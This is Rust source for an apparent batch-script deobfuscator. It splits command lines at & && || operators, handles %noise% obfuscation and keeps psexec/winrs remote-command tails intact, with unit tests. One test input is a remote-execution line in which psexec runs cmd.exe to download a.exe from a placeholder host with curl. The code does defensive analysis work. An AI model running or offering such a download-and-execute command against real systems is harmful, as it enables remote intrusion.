//! Split a logical line into individual commands at top-level
//! `& && | ||` operators, respecting double-quotes and caret-escapes.

pub fn split_commands(line: &str) -> Vec<String> {
    let chars: Vec<char> = line.chars().collect();
    let mut out = Vec::new();
    let mut start = 0usize;
    let mut i = 0usize;
    let mut in_dq = false;
    while i < chars.len() {
        let c = chars[i];
        if c == '^' && i + 1 < chars.len() {
            i += 2;
            continue;
        }
        if c == '"' {
            in_dq = !in_dq;
            i += 1;
            continue;
        }
        if in_dq {
            i += 1;
            continue;
        }

        // Skip operator-internal & after >. Obfuscators often place empty
        // `%noise%` decorators between every character, so preserve `2>&1`
        // even while it still looks like `2%noise%>%noise%&%noise%1`.
        if c == '&'
            && (i > 0 && chars[i - 1] == '>'
                || is_obfuscated_redirect_duplication_ampersand(&chars, i))
        {
            i += 1;
            continue;
        }
        // `&` and `&&` are unconditional / conditional separators — split.
        // `||` is the failure-conditional separator — split.
        // Single `|` is a PIPELINE — keep both sides together as one
        // logical command so `type X | cmd` renders verbatim instead of
        // becoming two unrelated lines in the deob.
        if c == '&' {
            if protects_remote_cmd_tail_operator(&chars, i) {
                i += if chars.get(i + 1) == Some(&c) { 2 } else { 1 };
                continue;
            }
            let seg = chars[start..i].iter().collect::<String>();
            if let Some(trimmed) = trim_command_segment(&seg) {
                out.push(trimmed);
            }
            if chars.get(i + 1) == Some(&c) {
                i += 2;
            } else {
                i += 1;
            }
            start = i;
            continue;
        }
        if c == '|' && chars.get(i + 1) == Some(&'|') {
            let seg = chars[start..i].iter().collect::<String>();
            if let Some(trimmed) = trim_command_segment(&seg) {
                out.push(trimmed);
            }
            i += 2;
            start = i;
            continue;
        }
        i += 1;
    }
    let seg: String = chars[start..].iter().collect();
    if let Some(trimmed) = trim_command_segment(&seg) {
        out.push(trimmed);
    }
    out
}

fn is_obfuscated_redirect_duplication_ampersand(chars: &[char], amp_idx: usize) -> bool {
    previous_semantic_char(chars, amp_idx) == Some('>')
        && next_semantic_char(chars, amp_idx + 1).is_some_and(|ch| ch.is_ascii_digit())
}

fn previous_semantic_char(chars: &[char], mut idx: usize) -> Option<char> {
    while idx > 0 {
        let prev = idx - 1;
        if chars[prev] == '%' {
            if let Some(open) = preceding_decorator_ref_start(chars, prev) {
                idx = open;
                continue;
            }
        }
        return Some(chars[prev]);
    }
    None
}

fn next_semantic_char(chars: &[char], mut idx: usize) -> Option<char> {
    while idx < chars.len() {
        if chars[idx] == '%' {
            if let Some(close) = following_decorator_ref_end(chars, idx) {
                idx = close + 1;
                continue;
            }
        }
        return Some(chars[idx]);
    }
    None
}

fn preceding_decorator_ref_start(chars: &[char], close: usize) -> Option<usize> {
    let open = (0..close).rev().find(|idx| chars[*idx] == '%')?;
    is_probable_decorator_ref(&chars[open + 1..close]).then_some(open)
}

fn following_decorator_ref_end(chars: &[char], open: usize) -> Option<usize> {
    let close = chars[open + 1..]
        .iter()
        .position(|ch| *ch == '%')
        .map(|offset| open + 1 + offset)?;
    is_probable_decorator_ref(&chars[open + 1..close]).then_some(close)
}

fn is_probable_decorator_ref(name: &[char]) -> bool {
    name.len() >= 3
        && name
            .iter()
            .all(|ch| ch.is_ascii_alphanumeric() || *ch == '_')
}

fn protects_remote_cmd_tail_operator(chars: &[char], op_idx: usize) -> bool {
    let prefix = chars[..op_idx].iter().collect::<String>();
    let lower = prefix.to_ascii_lowercase();
    if !(lower.contains("psexec")
        || lower.contains("winrs")
        || lower.contains("winrm")
        || lower.contains("conhost"))
    {
        return false;
    }
    if !(lower.contains("cmd")
        || lower.contains("cmd.exe")
        || lower.contains("%comspec%")
        || lower.contains("!comspec"))
    {
        return false;
    }
    lower.contains(" /c ") || lower.ends_with(" /c") || lower.contains(" /k ")
}

fn trim_command_segment(segment: &str) -> Option<String> {
    let leading_trimmed = segment.trim_start();
    if leading_trimmed.is_empty() {
        return None;
    }
    if is_unquoted_set_assignment_segment(leading_trimmed) {
        Some(leading_trimmed.to_string())
    } else {
        Some(leading_trimmed.trim_end().to_string())
    }
}

fn is_unquoted_set_assignment_segment(segment: &str) -> bool {
    let segment = segment.trim_start_matches(['@', '(']);
    let lower = segment.to_ascii_lowercase();
    let Some(rest) = lower.strip_prefix("set") else {
        return false;
    };
    if !rest.as_bytes().first().is_some_and(u8::is_ascii_whitespace) {
        return false;
    }
    let body = segment["set".len()..].trim_start();
    !body.starts_with('/') && !body.starts_with('"') && body.contains('=')
}

#[cfg(test)]
mod tests {
    use super::split_commands;

    #[test]
    fn remote_cmd_c_tail_keeps_conditional_child_operator() {
        let parts = split_commands(
            r#"psexec \\target.example cmd.exe /V:ON /c set U=https://example.test/a&&curl -o a.exe !U!"#,
        );
        assert_eq!(parts.len(), 1, "{parts:?}");
        assert!(parts[0].contains("&&curl"), "{parts:?}");
    }

    #[test]
    fn ordinary_conditional_operator_still_splits() {
        let parts = split_commands("echo one&&echo two");
        assert_eq!(parts, vec!["echo one", "echo two"]);
    }

    #[test]
    fn obfuscated_redirect_duplication_ampersand_does_not_split() {
        let parts = split_commands("where python.exe >nul 2%noise%>%decorator%&%marker%1");
        assert_eq!(
            parts,
            vec!["where python.exe >nul 2%noise%>%decorator%&%marker%1"]
        );
    }
}
